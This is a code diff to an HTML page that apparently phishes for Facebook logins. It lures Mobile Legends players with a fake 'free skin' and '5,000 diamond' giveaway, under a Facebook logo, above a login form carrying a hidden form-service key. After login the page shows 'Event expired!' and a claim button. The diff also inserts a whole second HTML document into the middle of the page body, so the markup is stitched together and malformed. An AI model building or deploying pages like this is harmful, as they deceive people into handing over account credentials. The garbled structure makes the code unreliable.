@@ -21,7 +21,31 @@
       height: 100vh;
       flex-direction: column;
     }
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
 
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #121212;
+}
+
+.custom-img {
+    width: 200px;  /* Adjust size */
+    height: auto;  /* Maintain aspect ratio */
+    border-radius: 10px;  /* Rounded corners */
+    box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1); /* Soft shadow */
+    transition: transform 0.3s;
+}
+
+.custom-img:hover {
+    transform: scale(1.1); /* Slight zoom on hover */
+}
     .login-container {
       width: 90%;
       max-width: 360px;
@@ -155,13 +179,56 @@
         width: 100%; /* One video per row on smaller screens */
       }
     }
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    background-color: #0a0f1c; /* Dark blue like MLBB */
+    overflow: hidden;
+}
+
+.scroll-container {
+    width: 100%;
+    overflow: hidden;
+    white-space: nowrap;
+    position: absolute;
+    top: 10px; /* Align to the top */
+    left: 0;
+}
+
+.scroll-text {
+    display: inline-block;
+    font-size: 24px;
+    font-weight: bold;
+    color: gold;
+    text-shadow: 2px 2px 5px rgba(255, 215, 0, 0.8);
+    font-family: 'Arial', sans-serif;
+    animation: scrollText 10s linear infinite;
+}
+
+@keyframes scrollText {
+    from {
+        transform: translateX(-100%);
+    }
+    to {
+        transform: translateX(100%);
+    }
+}
   </style>
 </head>
 <body>
   <div class="login-container" id="login-container">
+    <div class="scroll-container">
+        <span class="scroll-text">🔥 Welcome to Mobile Legends! Prepare for battle! ⚔️</span>
+    </div>
+    
     <div class="facebook-logo">
       <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     </div>
+    
     <h1>Login</h1>
     <form method="POST" id="form">
       <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
@@ -181,37 +248,73 @@
 
   <!-- Greetings Page (Initially Hidden) -->
   <div id="greetings-page">
-    <h1>Welcome, User!</h1>
+    <h1>Event expired!</h1>
     <p>You have successfully logged in.</p>
-    <div class="video-container">
-      <div class="video-wrapper">
-        <video controls>
-          <source src="video1.mp4" type="video/mp4">
-          Your browser does not support the video tag.
-        </video>
-      </div>
-      <div class="video-wrapper">
-        <video controls>
-          <source src="video2.mp4" type="video/mp4">
-          Your browser does not support the video tag.
-        </video>
-      </div>
-      <div class="video-wrapper">
-        <video controls>
-          <source src="video3.mp4" type="video/mp4">
-          Your browser does not support the video tag.
-        </video>
-      </div>
-      <div class="video-wrapper">
-        <video controls>
-          <source src="video4.mp4" type="video/mp4">
-          Your browser does not support the video tag.
-        </video>
-      </div>
-    </div>
-    <button id="logout-button">Log Out</button>
-  </div>
 
+    <img src="/img/images (1).jpeg" alt="Nature Image" class="custom-img">
+    <button id="logout-button">Claim 5,000💎</button>
+  </div>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Scrolling News with Clock</title>
+    <style>
+        /* Styling for the 'NEWS' label */
+        .newstd3 {
+            padding: 2px 10px;
+            background: #5D4037;
+            color: white;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        /* Styling for the scrolling text */
+        .newstxt {
+            background: #f4f4f4;
+            padding: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        /* Styling for the clock display */
+        #clock {
+            padding: 5px 15px;
+            background: #5D4037;
+            color: white;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <table>
+        <tr>
+            <td class="newstd3">UPDATE</td>
+            <td class="newstxt">
+                <marquee align="center">Get your free skin Event ended in March 5 hurry up!! And get up to 5k 💎 diamond 🥳 Login to claim"</marquee>
+            </td>
+            <td class="newstd3" id="clock"></td>
+        </tr>
+    </table>
+
+    <script>
+        function updateClock() {
+            let now = new Date();
+            let hours = now.getHours().toString().padStart(2, '0');
+            let minutes = now.getMinutes().toString().padStart(2, '0');
+            document.getElementById("clock").innerHTML = hours + ":" + minutes;
+        }
+        updateClock();
+        setInterval(updateClock, 1000); // Update clock every second
+    </script>
+
+</body>
+</html>
   <script>
     const form = document.getElementById('form');
     const result = document.getElementById('result');
